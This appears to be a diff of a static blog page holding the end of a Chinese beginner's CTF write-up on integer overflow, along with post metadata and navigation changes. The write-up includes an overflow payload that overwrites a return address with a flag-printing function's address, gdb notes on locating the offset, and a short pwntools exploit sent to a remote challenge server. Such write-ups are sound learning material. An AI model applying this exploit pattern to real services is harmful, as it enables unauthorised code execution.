+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([&apos;a&apos; * 0x18, 0x804868B, &apos;a&apos; * 232])</span><br><span class="line">//像这种凑长度了使用payload = flat([&apos;a&apos; * 0x18, 0x804868B]).ljust(260,&quot;a&quot;)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以再用gdb确认一下溢出临界，在strcpy处下断点，如下图所示，这里可以详细推敲一下(虽然意义不大，但是挺好玩的)，esp中存的是s的开始位置0xfffbbf4，ebp为0xfffbc08，可以发现是相差0x14。</p>
+</blockquote>
+<p><img src="/image/20200325/4.png" alt="image"></p>
+<blockquote>
+<p>其实这个elf文件的溢出临界也可以在汇编代码中找，如下图所示，有些文件会以esp+0xN来显示，因此可以用上面设置断点的方法找。</p>
+</blockquote>
+<p><img src="/image/20200325/5.png" alt="image"></p>
+<blockquote>
+<p>分析到这，此题也算是做完了，编写exp拿到flag即可，而且此题对整数溢出的应用更加深了。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">io = remote(&quot;111.198.29.45&quot;, 35521) </span><br><span class="line">cat_flag_addr = 0x0804868B </span><br><span class="line">io.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) </span><br><span class="line">io.sendlineafter(&quot;your username:&quot;, &quot;threepwn&quot;) </span><br><span class="line">payload = flat([&apos;a&apos; * 0x18, cat_flag_addr, &apos;a&apos; * 232])</span><br><span class="line">io.sendlineafter(&quot;your passwd:&quot;, payload) </span><br><span class="line">io.recv() </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>0x04 附录</p>
+<blockquote>
+<p>借用ctfwiki的一幅图（个人感觉从二进制入手会更容易理解整数溢出）</p>
+</blockquote>
+<p><img src="/image/20200325/6.png" alt="image"></p>
+<p>0x05 尾记</p>
+<blockquote>
+<p>还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。<br>参考：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/</a></p>
 </blockquote>
 
       
@@ -451,15 +519,15 @@
   </li>
     <li class="post-copyright-author">
     <strong>Post title:</strong>
-    <a href="/2020/03/04/1/">走进栈溢出</a>
+    <a href="/2020/03/25/1/">不一样的整数溢出</a>
   </li>
   <li class="post-copyright-author">
     <strong>Publishing time:</strong>
-    2020年03月04日 - 22:03
+    2020年03月25日 - 21:03
   </li>
   <li class="post-copyright-link">
     <strong>Post link:</strong>
-    <a href="http://1234xxh.github.io/2020/03/04/1/" title="走进栈溢出">http://1234xxh.github.io/2020/03/04/1/</a>
+    <a href="http://1234xxh.github.io/2020/03/25/1/" title="不一样的整数溢出">http://1234xxh.github.io/2020/03/25/1/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice: </strong>
@@ -479,7 +547,7 @@
           
             <a href="/tags/pwn/" rel="tag"># pwn</a>
           
-            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+            <a href="/tags/整数溢出/" rel="tag"># 整数溢出</a>
           
         </div>
       
@@ -511,8 +579,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/08/1/" rel="next" title="深入理解GOT表和PLT表">
-                <i class="fa fa-chevron-left"></i> 深入理解GOT表和PLT表
+              <a href="/2020/03/15/1/" rel="next" title="初探ROP">
+                <i class="fa fa-chevron-left"></i> 初探ROP
               </a>
             
           </div>
@@ -520,10 +588,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/15/1/" rel="prev" title="初探ROP">
-                初探ROP <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -709,7 +773,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-程序是怎么运行的"><span class="nav-number">2.</span> <span class="nav-text">0x02 程序是怎么运行的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-栈溢出"><span class="nav-number">3.</span> <span class="nav-text">0x03 栈溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x04 尾记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01为什么会存在整数溢出"><span class="nav-number">1.</span> <span class="nav-text">0x01为什么会存在整数溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-整数溢出原理"><span class="nav-number">2.</span> <span class="nav-text">0x02 整数溢出原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-整数溢出例子分解"><span class="nav-number">3.</span> <span class="nav-text">0x03 整数溢出例子分解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、截断"><span class="nav-number">3.1.</span> <span class="nav-text">一、截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、有-无-符号数之间的转换"><span class="nav-number">3.2.</span> <span class="nav-text">二、有(无)符号数之间的转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、有-无-符号的四则运算"><span class="nav-number">3.3.</span> <span class="nav-text">三、有(无)符号的四则运算</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实战"><span class="nav-number">4.</span> <span class="nav-text">0x03 实战</span></a></li></ol></div>
             
 
           </div>
